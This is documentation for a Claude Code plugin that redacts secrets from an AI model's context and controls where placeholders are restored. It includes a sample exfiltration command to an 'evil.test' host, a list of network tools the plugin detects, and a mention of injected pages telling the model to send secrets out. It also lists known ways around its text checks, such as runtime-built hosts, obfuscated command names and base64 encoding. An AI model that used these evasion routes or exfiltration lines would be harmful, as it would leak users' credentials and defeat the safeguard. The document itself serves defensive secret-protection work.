# Claude Code

Anything that reaches Claude's conversation stays there. Claude Code sends it again on every turn, saves it in the session file, and copies it into every subagent. The only fix is to keep it out.

## Install the mod

The `redact` mod sends everything that enters the conversation through redact before Claude reads it. When Claude uses a placeholder in a command, the mod puts the real value back.

::: warning One redactor at a time
Before you install, turn off any other redacting mod, such as `transcript-redactor`. With two mods, the other one masks first. Its placeholders reach Claude, and redact cannot put the real value back.
:::

1. Install the binary. See [Getting started](../guide/getting-started).
2. Check that Claude Code can find it:

   ```sh
   redact scan --help
   ```

3. In Claude Code, install the mod:

   ```
   /plugin install redact --marketplace Drewtopia/redact
   ```

4. Answer `y` to add the marketplace, then pick a scope.

Your [config](../reference/config) applies as it does in a pipe: the same packs, `me`, `env`, `allow`, and overrides. The mod runs redact in the session's folder, so `dir` overrides and `env_files` follow the project you are in.

## What it covers

| Where text enters | What the mod does |
| :- | :- |
| Your prompt, and context a hook adds to it | Hides each part before Claude Code sends it |
| Every tool result: Bash, Read, Grep, MCP tools, and subagent answers | Hides each part before Claude reads it, except PDFs and images. See [Tool results](#tool-results) and [What it misses](#what-it-misses) |
| CLAUDE.md and the context on the first message | Hides each part |
| `@`-mentioned files | Refuses a file that holds something to hide, and points Claude to the Read tool, whose result is hidden. PDFs and images go through unscanned |
| A subagent's task | Hides each part. A workflow agent whose prompt holds something to hide is not started |

### Tool results

Before Claude reads a tool result, the mod also:

- Hides object keys, not only values.
- Reads each field with its name and scans the JSON structure, so long or multiline passwords and structured Kubernetes or Docker credentials are hidden even when their values alone look plain.
- Withholds a result whose secret sits in a number, because a number cannot hold a placeholder.
- Withholds a result if a match in its JSON cannot be mapped back to the original fields safely.

The mod passes a Bash or PowerShell command's own text to redact as `--command`, through `REDACT_COMMAND`. A `command` [override](../reference/config#overrides) then applies to that command's output alone. A line that could run more than one command (`;`, `&&`, `|`, a redirect, a new line, `$(…)`, backticks, or PowerShell's `(…)` and `{…}`) is not passed on, so an override never switches hiding off for the commands chained after it.

## Placeholders going back in

When Claude writes a placeholder into a command or a file, the mod swaps it back for the real value. So `./deploy.sh --key [SECRET-a1b2c3d4]` still works. Four rules keep that safe.

### Only local tools

By default, Bash, PowerShell, Write, Edit, MultiEdit, NotebookEdit, Read, Glob, and Grep get real values. Agent, WebFetch, WebSearch, and MCP tools do not. An MCP tool off the list is refused a placeholder this session made, since it would store the placeholder text where nothing can read it back.

To change the list, use the `restoreTools` setting. It holds tool names separated by commas and replaces the default list, so keep the names you still want. In a name, `*` matches any run of characters. A `!` in front of a name leaves that tool out, wherever it sits in the list. For example, `Bash,Read,mcp__notes__*,!mcp__notes__share` gives real values to Bash, Read, and every tool of a `notes` app except `mcp__notes__share`. Never list a lone `*`: it would match every tool, Agent and WebFetch included.

A listed tool receives real values, so list only tools you trust with them. Leave out every tool that sends text to another service, such as one that posts a comment, opens an issue, or shares a note.

### Only to hosts you list

A Bash or PowerShell command that would send a real value to another machine is refused, unless every host it names is in the `restoreHosts` setting. The list starts empty. Each entry covers its subdomains, so `example.com` also covers `api.example.com`.

List only names you control. A domain where anyone can make a subdomain, such as `github.io`, `vercel.app` or `amazonaws.com`, lets anyone receive your values: list `you.github.io` or the full bucket host, not the shared domain.

```text
restoreHosts = api.example.com, registry.example.org
```

With that list, `curl -H "x-api-key: [SECRET-a1b2c3d4]" https://api.example.com/v1/jobs` gets the real key. `curl https://evil.test/?k=[SECRET-a1b2c3d4]` is refused and never runs, so a page or file that tells Claude to send a placeholder somewhere cannot get the value out that way.

The mod reads the command as written, with its quotes and escapes removed, and with them as spaces, so `c''url` still reads as `curl`. It finds:

- each `scheme://host`, `user@host`, Bash's `/dev/tcp/host`, and PowerShell's `\\host\share`
- every host name or IP address anywhere in the command, option values included (`-x proxy`, `--resolve`, `--connect-to`), in any form a resolver takes (`1.1`, `16843009`, `0x01010101`)
- when the command names a network tool such as `curl`, `wget`, `ssh`, `nc`, `dig`, `openssl`, `docker` or `Invoke-RestMethod`: also a host with no dot, as `box:/path` or `box:22`, or as the first word after `nc`, `ssh`, `ping` or `dig`

A network tool with no host the mod can find is refused too: write the URL in full. A file name such as `body.json` or `deploy.sh` does not count as a host, but a dotted name such as `pkg.module` or a version such as `1.2` does, so a command carrying a real value refuses those too.

Like the git check below, this reads text. A host the command puts together while it runs (`$(printf evil).test`) or reads from a file (`curl -K config`) gets past it, and so does a value written to a file first and sent from there.

### Not into git history or a pull request

These commands never get a real value: `git commit`, `git tag`, `gh pr`, `gh issue`, `gh api`, `glab mr`, and `az repos`. One that holds a placeholder this session made is refused and not run, so a commit message or an issue body can neither carry the value off the machine nor keep a placeholder no one can read back. Placeholder-shaped text the session did not make, such as an example in a doc, goes through as it is.

The check reads the command's text with its quotes and escapes taken out. A command that names `git` and `commit` anywhere counts, in either order and however they are quoted, split or nested. So `git log --grep=commit` is refused a placeholder too. It is a check on text, not a sandbox: a command that builds the word `git` or `commit` while it runs (`$'\x67it'`, `g[i]t`, `$(printf git)`) can still get a real value. It stops a placeholder going out by accident, not a model set on leaking one, which could also write the value to a file and commit that.

::: warning A file still gets the real value
Write puts the real value into a file, and a later `git add` and `git commit` would publish it. The [pre-commit check](./git-ci) catches that.
:::

### No shell code

The mod does not put a value into a Bash or PowerShell command when the value holds spaces, quotes, `$`, or other shell characters. It refuses the call instead, and tells Claude to write the value to a file and read it from there. A person's name with a space in it is such a value.

When a tool prints a value the mod handed it, that value comes back hidden, even where no rule would find it. So does any run of 6 or more of its characters that mixes kinds of character (lower case, capitals, digits, symbols), for the rest of the session, so `cut -c1-12` or `${v:0:8}` cannot show part of it. A run of one kind, such as `password`, stays visible, so a human password does not hide that word everywhere. A value the command encodes or decodes (`base64`, `xxd`, a JWT's payload) can still come back readable.

## What it misses

- **PDFs and images.** The mod cannot read a PDF's text, so a PDF goes to Claude unscanned, whether it is `@`-mentioned or opened with Read. Images also go unscanned, because they reach Claude as pictures.
- **An `allow` added mid-session.** The mod keeps hiding a value it hid earlier in the session, wherever it turns up. Start a new session for the `allow` to take effect.

## When redact cannot run

The mod fails closed. It withholds the text instead of passing it on raw when the redact binary:

- is missing
- is too old
- exits with an error, such as a pack that will not load

A toast says why.

The rules live in the binary and the hook logic in the mod, so a fix can need both. Once a session the mod runs `redact --version`, and a toast says so when the binary comes from another release than the mod. Update the older one: `mise up github:Drewtopia/redact` for the binary.

If `redact` is not on Claude Code's `PATH`, the mod looks for it where installers put it before it gives up:

- mise's shims folder (`$MISE_DATA_DIR`, `$XDG_DATA_HOME/mise`, `~/.local/share/mise`, `~/.mise` or `%LOCALAPPDATA%\mise`)
- `$CARGO_HOME/bin` and `~/.cargo/bin`
- `~/.local/bin`, `/opt/homebrew/bin` and `/usr/local/bin`

This covers a session started by an app or service that was already running when you installed redact, so its `PATH` was set before redact existed. If the mod still cannot find it, set the `binary` setting to its full path. A `binary` that holds a path is used as given.

## Settings

Claude Code asks for these settings when you install the mod. To change them later, open the `/plugin` menu.

| Setting | Default | What it does |
| :- | :- | :- |
| `binary` | `redact` | The redact command to run |
| `restoreTools` | `Bash,PowerShell,Write,Edit,MultiEdit,NotebookEdit,Read,Glob,Grep` | Tools that get the real value behind a placeholder, separated by commas. `*` matches any run of characters, and `!` in front of a name leaves that tool out. List only tools you trust with real values |
| `restoreHosts` | empty | Hosts a shell command may send a real value to, separated by commas. Each covers its subdomains |
| `notify` | on | A count on the tool row and a toast on a prompt when something is hidden |

## Without the mod: a hook

A plain [PostToolUse hook](https://code.claude.com/docs/en/hooks) can mask Bash output with only redact and `jq`. It covers less than the mod:

- It cannot rewrite your prompt.
- It puts no real value back into commands.
- The session file on disk keeps the original output.

1. Save this as `~/.claude/hooks/redact-bash.sh` and make it executable:

   ```sh
   #!/bin/sh
   # PostToolUse hook for Claude Code: masks a Bash call's stdout and stderr.
   in=$(cat)
   out=$(printf '%s' "$in" | jq -r '.tool_response.stdout // ""' | redact) &&
   err=$(printf '%s' "$in" | jq -r '.tool_response.stderr // ""' | redact) ||
     { out='redact failed, so this output was withheld'; err=''; }
   printf '%s' "$in" | jq --arg o "$out" --arg e "$err" \
     '{hookSpecificOutput: {hookEventName: "PostToolUse", updatedToolOutput: (.tool_response + {stdout: $o, stderr: $e})}}'
   ```

2. Add the hook to `~/.claude/settings.json`:

   ```json
   {
     "hooks": {
       "PostToolUse": [
         { "matcher": "Bash", "hooks": [{ "type": "command", "command": "~/.claude/hooks/redact-bash.sh" }] }
       ]
     }
   }
   ```

## Pipe output yourself

Without the mod or the hook, run the command, pipe it through redact, and paste the result:

```sh
gh issue view 1234 | redact
```

## Two placeholders, one value

The mod keeps one placeholder per value for the whole session. A pipe works differently. The same value gets the same placeholder within one run, and a new one in the next run. To keep placeholders the same across runs, set a key:

```sh
export REDACT_KEY=$(openssl rand -hex 32)
```

See [How it works](../reference/how-it-works).
